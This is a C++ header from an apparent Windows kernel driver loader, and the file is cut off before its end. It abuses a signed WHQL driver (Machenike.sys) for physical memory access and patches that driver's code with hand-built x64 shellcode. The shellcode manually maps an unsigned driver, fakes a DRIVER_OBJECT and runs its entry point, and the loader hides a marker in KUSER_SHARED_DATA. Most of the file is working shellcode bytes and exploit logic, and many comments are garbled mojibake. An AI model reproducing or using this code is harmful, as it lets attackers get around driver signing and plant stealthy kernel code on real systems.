#pragma once
#include "loader_common.h"
#include "phys_walk.h"
#include "manual_map.h"

// ============================================================
// shellcode_builder.h â åæ ¸ Shellcode æé å¨
//
// èè´£ï¼
//   1. æ«æ WHQL é©±å¨ default åæ¯ä½ç½®ï¼ç©çç¹å¾ç æç´¢ï¼
//   2. å¤ä»½åå§å­è
//   3. æé  Shellcodeï¼
//      a. ExAllocatePoolWithTag â åéç®æ éååå­
//      b. ç©çåå¥ drv_wsk å±å¼éåï¼éè¿ç¨æ·æç¼å²åºç©çå°åï¼
//      c. æé ä¼ª DRIVER_OBJECT + KLDR_DATA_TABLE_ENTRY
//      d. æå¥ PsLoadedModuleList
//      e. è°ç¨ drv_wsk DriverEntry
//      f. æ¢å¤ WHQL default åæ¯åå§å­è
//   4. å° Shellcode åå¥ WHQL é©±å¨ default åæ¯ä½ç½®
// ============================================================

// ---- æ«æ WHQL é©±å¨ç default åæ¯ç©çä½ç½® ----
// ç¹å¾ï¼mov ebx, STATUS_INVALID_PARAMETER (0xC000000D); jmp rel32
// IDA éåå®æµï¼BB 0D 00 00 C0 E9

static const uint8_t WHQL_DEFAULT_SIG[] = {
    0xBB, 0x0D, 0x00, 0x00, 0xC0, 0xE9  // mov ebx, 0xC000000D; jmp rel32
};

struct WhqlPatchSite {
    uint64_t kernVA;    // WHQL é©±å¨ä»£ç æ®µä¸­çåæ ¸ VA
    uint64_t physAddr;  // å¯¹åºç©çå°å
    uint8_t  original[64]; // å¤ä»½åå§å­è
};

// å¨ç©çåå­ç WHQL é©±å¨ä»£ç æ®µèå´åæ«æ default ç¹å¾ç 
static bool FindWhqlDefaultBranch(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t whqlDrvBase,   // WHQL é©±å¨åæ ¸ VA åºåï¼ä» PsLoadedModuleList è¯»åï¼
    uint32_t whqlDrvSize,   // é©±å¨éåå¤§å°
    WhqlPatchSite& site)
{
    LOG_INFO("FindWhqlDefaultBranch: scanning WHQL driver 0x%016llX size=0x%X",
             whqlDrvBase, whqlDrvSize);

    // å¨é©±å¨èæå°åç©ºé´åé 4KB é¡µæ«æ
    for (uint32_t off = 0; off + 0x1000 <= whqlDrvSize; off += 0x1000) {
        uint64_t pageVA = whqlDrvBase + off;
        uint64_t pagePA = 0;
        if (!VirtToPhys(hDev, cr3, pageVA, &pagePA)) continue;

        uint8_t pageBuf[0x1000] = {};
        if (!WhqlReadPhys(hDev, pagePA, pageBuf, sizeof(pageBuf))) continue;

        for (size_t i = 0; i + sizeof(WHQL_DEFAULT_SIG) < sizeof(pageBuf); i++) {
            if (memcmp(pageBuf + i, WHQL_DEFAULT_SIG, sizeof(WHQL_DEFAULT_SIG)) == 0) {
                site.kernVA  = pageVA + i;
                site.physAddr = pagePA + i;
                memcpy(site.original, pageBuf + i,
                       min(sizeof(site.original), sizeof(pageBuf) - i));
                LOG_OK("FindWhqlDefaultBranch: found at VA=0x%016llX PA=0x%016llX",
                       site.kernVA, site.physAddr);
                return true;
            }
        }
    }
    LOG_ERR("FindWhqlDefaultBranch: signature not found");
    return false;
}

// ---- ä»æ¬å° ntoskrnl.exe å¯¼åºè¡¨è§£æ PsLoadedModuleList çåæ ¸èæå°å ----
static uint64_t ResolvePsLoadedModuleList(uint64_t ntoskrnlBase)
{
    wchar_t sysPath[MAX_PATH] = {};
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\ntoskrnl.exe");

    HMODULE hNtos = LoadLibraryExW(sysPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        hNtos = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    }
    if (!hNtos) {
        LOG_ERR("ResolvePsLoadedModuleList: Failed to load ntoskrnl.exe");
        return 0;
    }

    FARPROC proc = GetProcAddress(hNtos, "PsLoadedModuleList");
    if (!proc) {
        LOG_ERR("ResolvePsLoadedModuleList: PsLoadedModuleList export not found in ntoskrnl.exe");
        FreeLibrary(hNtos);
        return 0;
    }

    uint32_t rva = (uint32_t)((uint8_t*)proc - (uint8_t*)hNtos);
    FreeLibrary(hNtos);

    uint64_t psLoadedModuleListVA = ntoskrnlBase + rva;
    LOG_OK("ResolvePsLoadedModuleList: PsLoadedModuleList RVA=0x%X -> VA=0x%016llX",
           rva, psLoadedModuleListVA);
    return psLoadedModuleListVA;
}

// ---- éè¿ Psapi æä¸¾è®¾å¤é©±å¨ä½ä¸ºå¤ç¨å®ä½æ¹æ¡ ----
static bool FindWhqlModuleViaPsapi(
    const wchar_t* targetName,
    uint64_t& outDllBase,
    uint32_t& outSizeOfImage)
{
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int count = cbNeeded / sizeof(drivers[0]);
        for (int i = 0; i < count; i++) {
            wchar_t baseName[MAX_PATH] = {};
            if (GetDeviceDriverBaseNameW(drivers[i], baseName, MAX_PATH)) {
                if (_wcsicmp(baseName, targetName) == 0) {
                    outDllBase = (uint64_t)drivers[i];
                    // è·åæ¬å°é©±å¨æä»¶ç SizeOfImage
                    wchar_t drvPath[MAX_PATH] = {};
                    if (FindWhqlDriverFile(drvPath, MAX_PATH)) {
                        auto raw = ReadFile(drvPath);
                        if (raw.size() > sizeof(IMAGE_DOS_HEADER)) {
                            auto* dos = (IMAGE_DOS_HEADER*)raw.data();
                            if (dos->e_magic == IMAGE_DOS_SIGNATURE && dos->e_lfanew < (LONG)raw.size()) {
                                auto* nt = (IMAGE_NT_HEADERS64*)(raw.data() + dos->e_lfanew);
                                if (nt->Signature == IMAGE_NT_SIGNATURE) {
                                    outSizeOfImage = nt->OptionalHeader.SizeOfImage;
                                }
                            }
                        }
                    }
                    if (outSizeOfImage == 0) {
                        outSizeOfImage = 0x20000;
                    }
                    LOG_OK("FindWhqlModuleViaPsapi: found %ls base=0x%016llX size=0x%X",
                           targetName, outDllBase, outSizeOfImage);
                    return true;
                }
            }
        }
    }
    LOG_ERR("FindWhqlModuleViaPsapi: '%ls' not found via EnumDeviceDrivers", targetName);
    return false;
}

// ---- æ¥æ¾ WHQL é©±å¨å¨ PsLoadedModuleList ä¸­çæ¡ç® ----
static bool FindWhqlModuleInLdr(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t psLoadedModuleList,  // PsLoadedModuleList åæ ¸ VA
    const wchar_t* targetName,    // å¦ L"Machenike.sys"
    uint64_t& outDllBase,
    uint32_t& outSizeOfImage,
    uint64_t& outLdrEntryVA)      // è¯¥ LDR æ¡ç®çåæ ¸ VAï¼KLDR_DATA_TABLE_ENTRY*ï¼
{
    if (psLoadedModuleList == 0) return false;
    uint64_t head = psLoadedModuleList;
    uint64_t cur  = 0;
    // è¯»åé¾è¡¨å¤´ç Flink
    if (!ReadKernelVA(hDev, cr3, head, &cur, 8)) return false;

    int limit = 512;
    while (cur != head && limit-- > 0) {
        KLDR_ENTRY_K entry = {};
        if (!ReadKernelVA(hDev, cr3, cur, &entry, sizeof(entry))) break;

        if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Buffer) {
            size_t cch = entry.BaseDllName.Length / 2;
            std::vector<wchar_t> nameBuf(cch + 1, 0);
            ReadKernelVA(hDev, cr3, entry.BaseDllName.Buffer,
                         nameBuf.data(), cch * 2);
            nameBuf[cch] = 0;

            if (_wcsicmp(nameBuf.data(), targetName) == 0) {
                outDllBase     = entry.DllBase;
                outSizeOfImage = entry.SizeOfImage;
                outLdrEntryVA  = cur; // cur = KLDR_DATA_TABLE_ENTRY åæ ¸ VAï¼InLoadOrderLinks å¨åç§» 0ï¼
                LOG_OK("FindWhqlModuleInLdr: found %ls base=0x%016llX size=0x%X LdrEntry=0x%016llX",
                       targetName, outDllBase, outSizeOfImage, outLdrEntryVA);
                return true;
            }
        }
        cur = entry.Flink;
    }
    LOG_ERR("FindWhqlModuleInLdr: '%ls' not found", targetName);
    return false;
}

// ================================================================
// Shellcode æ°æ®ç»æï¼æ¹æ¡ C ç´§åå®æ´çï¼72 å­è = 0x48ï¼
// è¿é¨åæ°æ®é Shellcode ä¸èµ·åå¥ Code Caveï¼ç± Shellcode è¿è¡æ¶è¯»å
// ================================================================
#pragma pack(push, 1)
struct ShellcodeParams {
    uint64_t pfnExAllocatePoolWithTag;    // 0x00 ntoskrnl å¯¼åº
    uint64_t pfnIofCompleteRequest;       // 0x08 ntoskrnl 导出 IofCompleteRequest (自闭环完成 IRP)
    uint64_t pfnMmCopyMemory;             // 0x10
    uint64_t userImageVA;                 // 0x18 ç¨æ·æå±å¼éåçèæå°å
    uint32_t imageSize;                   // 0x20 SizeOfImage
    uint32_t entryPointOffset;            // 0x24 DriverEntry ç¸å¯¹äºéååºåçåç§»
    uint32_t relocDirRVA;                 // 0x28 BaseRelocation ç®å½ RVA
    uint32_t relocDirSize;                // 0x2C BaseRelocation ç®å½å¤§å°
    uint64_t originalImageBase;           // 0x30 PE OptionalHeader ä¸­çåå§ ImageBase
    volatile uint32_t completed;          // 0x38 Shellcode æ§è¡å®ææ å¿ï¼ä¿çå¤ç¨ï¼
    uint32_t status;                      // 0x3C NT STATUS æ§è¡ç»æ
    uint64_t allocatedPoolVA;             // 0x40 åæ ¸æ± åºåï¼ExAllocatePoolWithTag è¿åï¼
    uint64_t hookReturnVA;                // 0x48 è·³å WHQL å®¿ä¸»é©±å¨ç°åº (site.kernVA + 5)
    uint64_t whqlDrvBase;                 // 0x50 å®¿ä¸»é©±å¨ (Machenike.sys) åæ ¸ VA â fakeDriverObj.DriverStart
    uint32_t whqlDrvSize;                 // 0x58 å®¿ä¸»é©±å¨ SizeOfImage â fakeDriverObj.DriverSize
    uint64_t whqlLdrEntryVA;              // 0x5C å®¿ä¸» KLDR_DATA_TABLE_ENTRY åæ ¸ VA â fakeDriverObj.DriverSection
    DRV_BOOT_CONFIG bootConfig;           // 0x64 (20 å­è) Loader æ³¨å¥ç» DriverEntry çå¯å¨åæ°
};
#pragma pack(pop)
static_assert(sizeof(ShellcodeParams) == 120, "ShellcodeParams size must be exactly 120 bytes (0x78)");

// ================================================================
// æ¹æ¡ C Shellcode æºå¨ç ï¼x64ï¼323 å­èï¼
// ç¹æ§ï¼
//   1. call/pop ç¸å¯¹å¯»åå®ä½ç´§é»å¨åé¢ç 120 å­è ShellcodeParams
//   2. ExAllocatePoolWithTag(NonPagedPool=0, ImageSize+0x200) åéåæ ¸åå­
//      é¢å¤ 0x200 å­èç¨äºå¨ Pool å°¾é¨æé å¸¸é©»ä¼ª DRIVER_OBJECT
//   3. MmCopyMemory(MM_COPY_MEMORY_VIRTUAL=2) ä»è°ç¨è¿ç¨ä¸ä¸æç´æ¥èææ·è´éå
//   4. å®æ´éå PE .reloc ç®å½ï¼èªå¨ä¿®å¤ææ IMAGE_REL_BASED_DIR64 éå®ä½é¡¹
//   5. æé  fakeDriverObjï¼
//      - Type=4, Size=0x150ï¼æ»¡è¶³ ObReferenceObjectByHandle æ ¡éªï¼
//      - DeviceObject(+0x008) = Pool åºå
//      - DriverStart/Section æå Machenike.sys/tcpip.sys
//   6. è°ç¨ DriverEntry(fakeDriverObj, &BootConfig) ââ rdx ä¼ åä¼ å¥åæ ¸å¯å¨åæ°
//   7. jmp r11 å¹³ç¨³è·³åå®¿ä¸»ç°åº (site.kernVA + 5) æ­£å¸¸å®æ IRP è¿å
// ================================================================
static const uint8_t scBytes[] = {
    0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5B, 0x49, 0x83, 0xEB, 0x7D, 0x53, 0x56, 0x57, 0x41, 0x54,
    0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x49, 0x8B, 0xDB, 0x33, 0xC9, 0x8B,
    0x53, 0x20, 0x81, 0xC2, 0x00, 0x02, 0x00, 0x00, 0x41, 0xB8, 0x4D, 0x6D, 0x53, 0x74, 0xFF, 0x13,
    0x48, 0x85, 0xC0, 0x0F, 0x84, 0x08, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xE0, 0x49, 0x8B, 0xCC, 0x48,
    0x8B, 0x53, 0x18, 0x44, 0x8B, 0x43, 0x20, 0x41, 0xB9, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44,
    0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0xFF, 0x53, 0x10, 0x85, 0xC0, 0x0F, 0x85, 0xCB, 0x00,
    0x00, 0x00, 0x4D, 0x8B, 0xEC, 0x4C, 0x2B, 0x6B, 0x30, 0x74, 0x5E, 0x83, 0x7B, 0x2C, 0x00, 0x74,
    0x58, 0x48, 0x63, 0x43, 0x28, 0x4D, 0x8D, 0x34, 0x04, 0x48, 0x63, 0x43, 0x2C, 0x4D, 0x8D, 0x3C,
    0x06, 0x4D, 0x3B, 0xF7, 0x73, 0x43, 0x41, 0x8B, 0x16, 0x85, 0xD2, 0x74, 0x3C, 0x41, 0x8B, 0x4E,
    0x04, 0x85, 0xC9, 0x74, 0x34, 0x83, 0xE9, 0x08, 0xD1, 0xE9, 0x74, 0x24, 0x49, 0x8D, 0x76, 0x08,
    0x0F, 0xB7, 0x06, 0x8B, 0xF8, 0xC1, 0xEF, 0x0C, 0x83, 0xFF, 0x0A, 0x75, 0x0B, 0x25, 0xFF, 0x0F,
    0x00, 0x00, 0x03, 0xC2, 0x4D, 0x01, 0x2C, 0x04, 0x48, 0x83, 0xC6, 0x02, 0xFF, 0xC9, 0x75, 0xE0,
    0x41, 0x8B, 0x46, 0x04, 0x4C, 0x03, 0xF0, 0xEB, 0xB8, 0x48, 0x63, 0x7B, 0x20, 0x49, 0x8D, 0x3C,
    0x3C, 0x57, 0x33, 0xC0, 0xB9, 0x00, 0x02, 0x00, 0x00, 0xF3, 0xAA, 0x5F, 0x66, 0xC7, 0x07, 0x04,
    0x00, 0x66, 0xC7, 0x47, 0x02, 0x50, 0x01, 0x4C, 0x89, 0x67, 0x08, 0x48, 0x8B, 0x43, 0x50, 0x48,
    0x89, 0x47, 0x18, 0x8B, 0x43, 0x58, 0x89, 0x47, 0x20, 0x48, 0x8B, 0x43, 0x5C, 0x48, 0x89, 0x47,
    0x28, 0x48, 0x8B, 0xCF, 0x48, 0x8D, 0x53, 0x64, 0x49, 0x8B, 0xC4, 0x4C, 0x63, 0x43, 0x24, 0x49,
    0x03, 0xC0, 0xFF, 0xD0, 0x85, 0xC0, 0x78, 0x12, 0x57, 0x49, 0x8B, 0xFC, 0x33, 0xC0, 0xB9, 0x00,
    0x10, 0x00, 0x00, 0xF3, 0xAA, 0x5F, 0x33, 0xC0, 0xEB, 0x1D, 0x8B, 0xF0, 0xEB, 0x05, 0xBE, 0x01,
    0x00, 0x00, 0xC0, 0x49, 0x8B, 0xCC, 0xBA, 0x4D, 0x6D, 0x53, 0x74, 0xFF, 0x53, 0x08, 0x8B, 0xC6,
    0xEB, 0x05, 0xB8, 0x17, 0x00, 0x00, 0xC0, 0x4C, 0x8B, 0x5B, 0x48, 0x48, 0x83, 0xC4, 0x38, 0x41,
    0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x8B, 0xD8, 0x41, 0xFF, 0xE3
};
static const size_t scBytes_size = sizeof(scBytes);

// ================================================================
// 微型内存分配探针 Shellcode（x64，66 字节）
// 触发后调用 ExAllocatePoolWithTag(NonPagedPool=0, imageSize+0x1000)
// 将返回的 poolVA 存入 params->allocatedPoolVA，然后平稳跳回 hook 现场
// 寄存器安全：完整保存并恢复调用者的所有非易失性及易失性寄存器
// 栈对齐：6个push (48字节) + sub rsp, 0x30 (48字节) = 96字节，严格满足 x64 ABI 16 字节对齐
// ================================================================
static const uint8_t scAllocProbe[] = {
    0xE8, 0x00, 0x00, 0x00, 0x00,                         // call $+5
    0x41, 0x5B,                                           // pop r11
    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D (r11 = params)
    0x53,                                                 // push rbx
    0x4C, 0x89, 0xDB,                                     // mov rbx, r11 (rbx = params，Non-Volatile不受子函数破坏)
    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28 (Shadow space + 16字节对齐)
    0x31, 0xC9,                                           // xor ecx, ecx (NonPagedPool = 0)
    0x8B, 0x53, 0x20,                                     // mov edx, [rbx + 0x20] (imageSize)
    0x81, 0xC2, 0x00, 0x10, 0x00, 0x00,                   // add edx, 0x1000
    0x41, 0xB8, 0x4D, 0x6D, 0x53, 0x74,                   // mov r8d, 0x74536D4D ('tSmM')
    0xFF, 0x13,                                           // call qword ptr [rbx] (ExAllocatePoolWithTag)
    0x48, 0x89, 0x43, 0x40,                               // mov [rbx + 0x40], rax (allocatedPoolVA)
    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
    // --- Self-Complete IRP & Flat Ret ---
    0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00,       // mov rcx, [rsp + 0xC0] (栈上有push rbx，真实pIrp在[rsp+0xC0])
    0xC7, 0x41, 0x30, 0x00, 0x00, 0x00, 0x00,             // mov dword ptr [rcx + 0x30], 0 (Status = STATUS_SUCCESS)
    0x48, 0xC7, 0x41, 0x38, 0x00, 0x00, 0x00, 0x00,       // mov qword ptr [rcx + 0x38], 0 (Information = 0)
    0x31, 0xD2,                                           // xor edx, edx (PriorityBoost = 0)
    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28 (Shadow space + 16字节对齐)
    0xFF, 0x53, 0x08,                                     // call qword ptr [rbx + 8] (IofCompleteRequest)
    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
    0x5B,                                                 // pop rbx (恢复调用者的rbx，此时rsp完全回到rsp_host)
    0x31, 0xC0,                                           // xor eax, eax (return STATUS_SUCCESS)
    0x48, 0x83, 0xC4, 0x70,                               // add rsp, 0x70 (平掉Machenike入口分配的0x70栈帧)
    0x41, 0x5F,                                           // pop r15
    0x41, 0x5E,                                           // pop r14
    0x41, 0x5D,                                           // pop r13
    0x41, 0x5C,                                           // pop r12
    0x5F,                                                 // pop rdi
    0x5E,                                                 // pop rsi
    0x5B,                                                 // pop rbx (恢复Machenike入口压栈的7个寄存器)
    0xC3                                                  // ret (平稳返回nt!IofCallDriver调用方)
};
static const size_t scAllocProbe_size = sizeof(scAllocProbe);

// ================================================================
// Direct Execute Shellcode（x64）
// 专用于 PTE Remap 方案：代码与 .pdata 已预先物理就绪于宿主内部，
// 此 Shellcode 刷新 TLB -> 构造 fakeDriverObj -> 调用宿主内 DriverEntry -> 平稳返回
// 寄存器安全：完整保存并恢复所有非易失性寄存器（包括 rbx）
// ================================================================
static const uint8_t scDirectExec[] = {
    0xE8, 0x00, 0x00, 0x00, 0x00,                         // call $+5
    0x41, 0x5B,                                           // pop r11
    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D
    0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, // push rbx, rsi, rdi, r12..r15
    0x4C, 0x89, 0xDB,                                     // mov rbx, r11 (rbx = params)
    0x48, 0x81, 0xEC, 0xB8, 0x01, 0x00, 0x00,             // sub rsp, 0x1B8
    0x0F, 0x20, 0xD8,                                     // mov rax, cr3
    0x0F, 0x22, 0xD8,                                     // mov cr3, rax (flush TLB)
    0x48, 0x8D, 0x7C, 0x24, 0x40,                         // lea rdi, [rsp + 0x40]
    0x31, 0xC0,                                           // xor eax, eax
    0xB9, 0x50, 0x01, 0x00, 0x00,                         // mov ecx, 0x150
    0x57,                                                 // push rdi
    0xF3, 0xAA,                                           // rep stosb
    0x5F,                                                 // pop rdi
    0x66, 0xC7, 0x07, 0x04, 0x00,                         // mov word ptr [rdi], 4
    0x66, 0xC7, 0x47, 0x02, 0x50, 0x01,                   // mov word ptr [rdi + 2], 0x150
    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18]
    0x48, 0x89, 0x47, 0x08,                               // mov [rdi + 8], rax
    0x48, 0x8B, 0x43, 0x50,                               // mov rax, [rbx + 0x50]
    0x48, 0x89, 0x47, 0x18,                               // mov [rdi + 0x18], rax
    0x8B, 0x43, 0x58,                                     // mov eax, [rbx + 0x58]
    0x89, 0x47, 0x20,                                     // mov [rdi + 0x20], eax
    0x48, 0x8B, 0x43, 0x5C,                               // mov rax, [rbx + 0x5C]
    0x48, 0x89, 0x47, 0x28,                               // mov [rdi + 0x28], rax
    0x48, 0x89, 0xF9,                                     // mov rcx, rdi
    0x48, 0x8D, 0x53, 0x64,                               // lea rdx, [rbx + 0x64]
    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18]
    0x48, 0x63, 0x4B, 0x24,                               // movsxd rcx, dword ptr [rbx + 0x24]
    0x48, 0x01, 0xC8,                                     // add rax, rcx
    0x48, 0x89, 0xF9,                                     // mov rcx, rdi
    0xFF, 0xD0,                                           // call rax
    0x89, 0x43, 0x3C,                                     // mov [rbx + 0x3C], eax
    0x48, 0x81, 0xC4, 0xB8, 0x01, 0x00, 0x00,             // add rsp, 0x1B8
    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,       // pop r15, r14, r13, r12
    0x5F, 0x5E,                                           // pop rdi, rsi (保留 rbx 保存 params 指针)
    // --- Self-Complete IRP & Flat Ret ---
    0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00,       // mov rcx, [rsp + 0xC0] (栈上有 push rbx，真实 pIrp 在 [rsp+0xC0])
    0xC7, 0x41, 0x30, 0x00, 0x00, 0x00, 0x00,             // mov dword ptr [rcx + 0x30], 0 (pIrp->IoStatus.Status = STATUS_SUCCESS)
    0x48, 0xC7, 0x41, 0x38, 0x00, 0x00, 0x00, 0x00,       // mov qword ptr [rcx + 0x38], 0 (pIrp->IoStatus.Information = 0)
    0x31, 0xD2,                                           // xor edx, edx (PriorityBoost = 0)
    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28 (Shadow space + 16 字节栈对齐)
    0xFF, 0x53, 0x08,                                     // call qword ptr [rbx + 8] (IofCompleteRequest，rbx 稳定非易失)
    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
    0x5B,                                                 // pop rbx (恢复调用者的 rbx，此时 rsp 完全回到 rsp_host)
    0x31, 0xC0,                                           // xor eax, eax (return STATUS_SUCCESS)
    0x48, 0x83, 0xC4, 0x70,                               // add rsp, 0x70 (平掉 Machenike 入口分配的 0x70 栈帧)
    0x41, 0x5F,                                           // pop r15
    0x41, 0x5E,                                           // pop r14
    0x41, 0x5D,                                           // pop r13
    0x41, 0x5C,                                           // pop r12
    0x5F,                                                 // pop rdi
    0x5E,                                                 // pop rsi
    0x5B,                                                 // pop rbx (恢复 Machenike 入口压栈的 7 个寄存器)
    0xC3                                                  // ret (平稳返回 nt!IofCallDriver 调用方)
};
static const size_t scDirectExec_size = sizeof(scDirectExec);

// æ¥æ¾é©±å¨ä»£ç æ®µä¸­çå®å¨ç©ºæ´ (Code Cave)
static uint64_t FindWhqlCodeCaveVA(HANDLE hDev, uint64_t cr3, uint64_t whqlDrvBase, size_t neededSize)
{
    // IDA éåå®æµï¼Machenike.sys ç .text æ®µæ«å°¾å¨ 0x140002831 ~ 0x140002A00
    // æ 463 å­èçè¿ç»­ 0x00 å¡«åç©ºé´ï¼åç§» 0x2840ï¼
    uint64_t candidateVA = whqlDrvBase + 0x2840;
    std::vector<uint8_t> buf(neededSize, 0);
    if (ReadKernelVA(hDev, cr3, candidateVA, buf.data(), neededSize)) {
        bool allZeroOrInt3 = true;
        for (uint8_t b : buf) {
            if (b != 0x00 && b != 0xCC && b != 0x90) {
                allZeroOrInt3 = false;
                break;
            }
        }
        if (allZeroOrInt3) {
            LOG_OK("FindWhqlCodeCaveVA: Found safe code cave VA=0x%016llX (size=%zu bytes)",
                   candidateVA, neededSize);
            return candidateVA;
        }
    }
    LOG_WARN("FindWhqlCodeCaveVA: Candidate cave not completely zeroed, using reserved cave VA=0x%016llX", candidateVA);
    return candidateVA;
}

struct InjectContext {
    HANDLE         hDev;
    uint64_t       cr3;
    uint64_t       ntoskrnlBase;
    uint64_t       psLoadedModuleList;
    uint64_t       whqlDrvBase;      // å®¿ä¸»é©±å¨åæ ¸ VA â fakeDriverObj.DriverStart
    uint32_t       whqlDrvSize;      // å®¿ä¸»é©±å¨ SizeOfImage â fakeDriverObj.DriverSize
    uint64_t       whqlLdrEntryVA;   // å®¿ä¸» KLDR_DATA_TABLE_ENTRY åæ ¸ VA â fakeDriverObj.DriverSection
    MappedImage*   pImg;
    uint64_t       userImageVA;      // ç¨æ·æå±å¼éåçèæå°å
    uint64_t       hookReturnVA;     // è·³åå®¿ä¸»é©±å¨ç°åº (site.kernVA + 5)
    DRV_BOOT_CONFIG bootConfig;      // æ³¨å¥ç» DriverEntry çå¯å¨åæ°
};

// æ­¥éª¤ 1ï¼è§£æ Shellcode æéçææåæ ¸å½æ°å°å
static bool BuildShellcodeParams(const InjectContext& ctx,
                                  ShellcodeParams& params)
{
    memset(&params, 0, sizeof(params));

    struct { const char* name; uint64_t* out; } needed[] = {
        { "ExAllocatePoolWithTag",     &params.pfnExAllocatePoolWithTag },
        { "IofCompleteRequest",        &params.pfnIofCompleteRequest    },
        { "MmCopyMemory",              &params.pfnMmCopyMemory          },
    };
    for (auto& n : needed) {
        *n.out = FindKernelExport(ctx.hDev, ctx.cr3, ctx.ntoskrnlBase, n.name);
        if (!*n.out) {
            LOG_ERR("BuildShellcodeParams: '%s' not found", n.name);
            return false;
        }
        LOG_HEX("  %-40s 0x%016llX", n.name, *n.out);
    }

    params.userImageVA        = ctx.userImageVA;
    params.imageSize          = ctx.pImg->SizeOfImage;
    params.entryPointOffset   = (uint32_t)ctx.pImg->EntryPointOffset;
    params.relocDirRVA        = ctx.pImg->RelocDirRVA;
    params.relocDirSize       = ctx.pImg->RelocDirSize;
    params.originalImageBase  = ctx.pImg->OriginalImageBase;
    params.completed          = 0;
    params.status             = 0;
    params.allocatedPoolVA    = 0;
    params.hookReturnVA       = ctx.hookReturnVA;
    params.whqlDrvBase        = ctx.whqlDrvBase;
    params.whqlDrvSize        = ctx.whqlDrvSize;
    params.whqlLdrEntryVA     = ctx.whqlLdrEntryVA;
    params.bootConfig         = ctx.bootConfig;

    LOG_OK("BuildShellcodeParams: params ready (RetVA=0x%016llX WhqlBase=0x%016llX LdrEntry=0x%016llX Mode=%u Port=%u)",
           params.hookReturnVA, params.whqlDrvBase, params.whqlLdrEntryVA,
           params.bootConfig.TransportMode, params.bootConfig.Port);
    return true;
}

// ================================================================
// ================================================================
// 基于 KUSER_SHARED_DATA 保留字段的重复加载检测机制
//
// 彻底放弃对宿主驱动 PE 头部（DOS 0x28 等）的修改与检查，
// 直接利用 Windows 全局共享数据页 KUSER_SHARED_DATA (0x7FFE0000 / 0xFFFFF78000000000)
// 偏移 0x800 的系统绝对空闲保留区，实现隐蔽跨环防重复加载判断。
// ================================================================
static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t /*drvBase*/, uint32_t /*drvOrigSize*/, const wchar_t* drvName)
{
    DRV_WSK_CANARY canary = {};
    bool canaryFound = false;

    // 1. 优先通过 R3 内存直接常数级读取 KUSER_SHARED_DATA (0x7FFE0000 + 0x800)
    __try {
        const uint8_t* pSharedData = (const uint8_t*)KUSER_SHARED_DATA_R3_VA;
        const DRV_WSK_CANARY* pCanary = (const DRV_WSK_CANARY*)(pSharedData + KUSER_SHARED_DATA_CANARY_OFF);
        if (pCanary->Magic == DRV_WSK_CANARY_MAGIC) {
            canary = *pCanary;
            canaryFound = true;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        canaryFound = false;
    }

    // 2. 备用保护：若 R3 直接读取未命中或发生异常，通过内核原语从内核 VA (0xFFFFF78000000800) 校验
    if (!canaryFound && hDev && cr3 != 0) {
        if (ReadKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &canary, sizeof(canary))) {
            if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
                canaryFound = true;
            }
        }
    }

    if (canaryFound) {
        LOG_OK("================================================================");
        LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in KUSER_SHARED_DATA (Offset 0x%llX)!", KUSER_SHARED_DATA_CANARY_OFF);
        LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
               canary.KernelImageVA, canary.ImageSize);
        LOG_OK("[+] Zero-PE modification: Host driver '%ls' PE header completely untouched!", drvName ? drvName : L"host");
        LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
        LOG_OK("================================================================");
        return true;
    }

    return false;
}

static bool ClearDriverCanary(HANDLE hDev, uint64_t cr3)
{
    DRV_WSK_CANARY zeroCanary = {};
    return WriteKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &zeroCanary, sizeof(zeroCanary));
}

// ================================================================
// ä¸»å¥å£ï¼LoadDrvWsk
//
// å®æ´å è½½æµç¨ï¼
//   1. æå¼ WHQL è®¾å¤å¥æ
//   2. è·å CR3 / KernBase / PsLoadedModuleList
//   3. æ£æ¥åæ ¸ç©çææ¡©ï¼æ¹æ¡ 1ï¼é¿åéå¤å è½½ï¼
//   4. æ«æ default åæ¯ç¹å¾ç 
//   5. è¯»åå¹¶å±å¼ drv_wsk.sys PE éåï¼manual mapï¼
//   6. ä¿®å¤éå®ä½ + IAT
//   7. æ¹é¤ PE å¤´
//   8. éå®ç¨æ·æå±å¼éåé¡µå¹¶è·åç©çå°å
